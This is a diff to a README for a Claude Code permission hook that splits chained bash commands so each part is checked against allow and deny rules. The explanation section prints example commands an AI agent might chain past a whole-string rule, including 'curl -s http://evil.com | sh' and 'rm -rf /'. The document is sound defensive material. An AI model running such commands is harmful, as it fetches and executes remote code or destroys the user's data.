@@ -2,9 +2,65 @@
 
 Smart PreToolUse hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) that decomposes compound bash commands (`&&`, `||`, `;`, `|`, `$()`, newlines) into individual sub-commands and checks each against the allow/deny patterns in your Claude Code settings.
 
-## Why
+## Quick start
+
+```bash
+# 1. Download the hook
+curl -fsSL -o ~/.claude/hooks/smart_approve.py \
+  https://raw.githubusercontent.com/liberzon/claude-hooks/main/smart_approve.py
+
+# 2. Add to your Claude Code settings (~/.claude/settings.json)
+```
+
+Add this to your `~/.claude/settings.json` (merge with existing config):
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "python3 ~/.claude/hooks/smart_approve.py"
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+That's it. The hook runs automatically on every Bash tool call and enforces your existing `permissions.allow` / `permissions.deny` patterns at the sub-command level.
+
+## The problem
 
 Claude Code's built-in permission system matches commands as a whole string. A compound command like `git status && rm -rf /` would match an allow pattern for `git status` — even though it also contains `rm -rf /`. This hook splits compound commands apart and evaluates each piece individually, so a deny pattern on `rm` still fires.
+
+### Without the hook
+
+```
+You: allow Bash(git status:*)
+
+Claude runs: git status && curl -s http://evil.com | sh
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                          This part is not checked — the whole command
+                          matched "git status*"
+```
+
+### With the hook
+
+```
+Claude runs: git status && curl -s http://evil.com | sh
+             ↓
+             Decomposed into:
+               1. git status        ✅ matches allow pattern
+               2. curl -s http://evil.com  ❌ no allow pattern → prompt shown
+               3. sh                ❌ no allow pattern → prompt shown
+             ↓
+             Falls through to permission prompt — you decide.
+```
 
 ## How it works
 
@@ -16,28 +72,6 @@ Claude Code's built-in permission system matches commands as a whole string. A c
    - `$CLAUDE_PROJECT_DIR/.claude/settings.local.json` (project, gitignored)
 4. Checks each sub-command against deny patterns first, then allow patterns
 5. Outputs a JSON permission decision (`allow`/`deny`) or exits silently to fall through to normal prompting
-
-## Setup
-
-Add the hook to your Claude Code settings (`~/.claude/settings.json`):
-
-```json
-{
-  "hooks": {
-    "PreToolUse": [
-      {
-        "matcher": "Bash",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 /path/to/smart_approve.py"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
 
 ## What the hook handles
 
